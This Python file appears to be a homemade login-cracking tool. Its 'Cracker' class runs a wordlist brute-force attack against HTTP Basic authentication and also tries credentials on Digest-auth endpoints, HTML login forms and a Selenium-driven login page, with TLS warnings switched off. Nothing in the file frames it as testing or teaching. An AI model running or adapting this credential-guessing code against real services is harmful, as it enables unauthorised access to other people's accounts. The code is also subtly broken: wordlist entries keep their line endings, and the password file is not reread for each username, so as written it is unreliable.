import requests
import socket
from requests.auth import HTTPBasicAuth, HTTPDigestAuth
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from htmlstructure import HTML
from selenium import webdriver


class Cracker:
    def __init__(self, url):
        self.numrequests = 0
        self.urlattack = url
        self.username=""
        self.password=""
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    def basicauthcrack(self, dictionary_user, dictionary_pass):
        dictus=open(dictionary_user)
        dictpass=open(dictionary_pass)
        result=False
        for lineaus in dictus:
            if result:
                break
            username=lineaus
            for lineapass in dictpass:
                password=lineapass
                response = requests.get(self.urlattack, auth=HTTPBasicAuth(username, password))
                print(response)
                if response.status_code == 200:
                    result=True
                    print('Usuario '+username+' y contraseña '+password+' válidos')
                    break
        if not result:
            print('Ningún usuario y contraseña válidos')
        dictus.close()
        dictpass.close()

    def digestauthcrack(self, username, password):
        response = requests.get(self.urlattack, auth=HTTPDigestAuth(username, password))
        if response.status_code == 200:
            print('Usuario y contraseña válidos')

    def formcrack(self, username, password):
        result = {'status': 0}
        try:
            response = requests.get(self.urlattack)
        except requests.exceptions.ConnectionError:
            result = {'status': -1}
        except socket.timeout:
            result = {'status': -2}

        if result['status'] < 0:
            print('Error in connection')

        if response.status_code != 200 and response.status_code != 403:
            print('Bad Status code')

        htmlcode = HTML(response.text, "html.parser")
        print(htmlcode)
        login_form = htmlcode.get_login_forms()[0]
        datasend = {'data': {}}

        if not (('usr_field' in login_form) and ('pwd_field' in login_form)):
            print('Error: form incorrect')
        if 'fields' in login_form:
            datasend.update(login_form['fields'])

        datasend['data'][login_form['usr_field']] = username
        datasend['data'][login_form['pwd_field']] = password

        responsepost = requests.post(self.urlattack, data=datasend['data'])
        htmlpost = HTML(responsepost.text, "html.parser")

        if (responsepost.status_code == 200) and (login_form not in htmlpost):
            print('Usuario y contraseña válidos')
        else:
            print('Usuario y contraseña incorrectos')

    def seleniumformcrack(self, username, password):
        driver=webdriver.Safari()
        driver.get(self.urlattack)

        user_box = driver.find_element("id", "username")
        pass_box=driver.find_element("id", "password")
        login=driver.find_element("class_name", "ui-button fn-width80")
        user_box.send_keys(username)
        pass_box.send_keys(password)
        login.click()
        driver.close()